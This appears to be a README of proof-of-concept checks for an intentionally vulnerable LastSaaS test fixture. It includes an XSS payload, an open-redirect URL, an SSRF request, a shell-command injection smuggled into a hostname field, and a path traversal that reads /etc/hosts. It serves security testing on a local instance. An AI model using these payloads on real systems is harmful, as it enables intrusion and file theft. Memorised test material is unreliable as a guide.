# LastSaaS fixture POCs

These checks are intended for a local LastSaaS instance only. They require a
temporary MongoDB database, the backend running from `fixtures/app-project-lastsaas/project/backend`,
an owner access token in `$ACCESS_TOKEN`, and the root tenant ID in
`$ROOT_TENANT_ID`. Keep those values outside the fixture.

Start the backend with the repository's normal setup:

```bash
cd fixtures/app-project-lastsaas/project
./scripts/setup.sh
set -a && source .env && set +a
cd backend
export PATH="$HOME/.local/go/bin:$PATH"
go run ./cmd/server
```

The fixture explicitly seeds the Free plan with flat pricing so the committed
MongoDB schema accepts the startup document.

Set a reusable authenticated request prefix in another shell:

```bash
export API='http://localhost:4290/api'
export AUTH=(-H "Authorization: Bearer $ACCESS_TOKEN" -H "X-Tenant-ID: $ROOT_TENANT_ID")
```

## Custom page HTML rendering

Create a harmless control page and a second page containing attacker-controlled
HTML:

```bash
curl -fsS "${AUTH[@]}" -H 'Content-Type: application/json' \
  -d '{"slug":"fixture-xss-control","title":"Fixture Control","htmlBody":"<p>Safe custom page</p>","isPublished":true}' \
  "$API/admin/branding/pages"
curl -fsS "${AUTH[@]}" -H 'Content-Type: application/json' \
  -d '{"slug":"fixture-xss","title":"Fixture XSS","htmlBody":"<img src=x onerror=alert(document.domain)>","isPublished":true}' \
  "$API/admin/branding/pages"
```

Open `http://localhost:4280/p/fixture-xss-control` and confirm the harmless
HTML renders. Then open `http://localhost:4280/p/fixture-xss` and confirm the
marker dialog appears. The payload is stored in the custom-page record and
reaches the React sink through the normal public branding API response.

## Login continuation

First verify the normal protected-route control. In a fresh browser context
without a session, open `http://localhost:4280/dashboard`, confirm that the
application sends you to `/login?returnTo=%2Fdashboard`, complete login, and
confirm that you return to `/dashboard`.

Then open the login page with an attacker-selected external continuation:

```text
http://localhost:4280/login?returnTo=https%3A%2F%2Fexample.com%2F
```

Complete a temporary local account login and confirm the browser navigates to
the selected external URL. The missing same-origin validation is the intended
vulnerability.

## Remote logo preview

Run a loopback-only marker server outside the fixture:

```bash
mkdir -p /tmp/lastsaas-ssrf
printf 'LASTSAAS_LOCAL_LOGO_MARKER\n' > /tmp/lastsaas-ssrf/logo.txt
python3 -m http.server 9001 --bind 127.0.0.1 --directory /tmp/lastsaas-ssrf
```

Fetch it through the authenticated branding preview:

```bash
curl -fsS "${AUTH[@]}" --get \
  --data-urlencode 'url=http://127.0.0.1:9001/logo.txt' \
  "$API/admin/branding/remote-preview" |
  jq -r .data | base64 -d | rg -F LASTSAAS_LOCAL_LOGO_MARKER
```

The control is a normal image URL served by the local marker server.

## DNS diagnostic

The same diagnostic is available from the authenticated Admin → Health page.
The route intentionally remains under the read-only root-admin role gate, so a
root-tenant `user` role can reach it.

The benign control resolves localhost:

```bash
curl -fsS "${AUTH[@]}" --get --data-urlencode 'hostname=localhost' \
  "$API/admin/health/diagnostics/dns"
```

Exercise the diagnostic with a harmless shell marker:

```bash
curl -fsS "${AUTH[@]}" --get \
  --data-urlencode 'hostname=localhost"; id; #' \
  "$API/admin/health/diagnostics/dns" | rg 'uid=[0-9]+'
```

## Branding media migration download

The in-root control reads the fixture-owned migration asset:

```bash
curl -fsS "${AUTH[@]}" --get --data-urlencode 'name=brand-preview.txt' \
  "$API/admin/branding/media/download" |
  rg -F 'LastSaaS branding preview asset'
```

Request `/etc/hosts` with a sufficiently deep relative path from the backend
working directory:

```bash
curl -fsS "${AUTH[@]}" --get \
  --data-urlencode 'name=../../../../../../../../../../etc/hosts' \
  "$API/admin/branding/media/download" | rg -F 'localhost'
```

Stop the backend, marker server, and temporary MongoDB instance after testing.
Remove the temporary account, tokens, cookies, logs, and `/tmp/lastsaas-ssrf`.
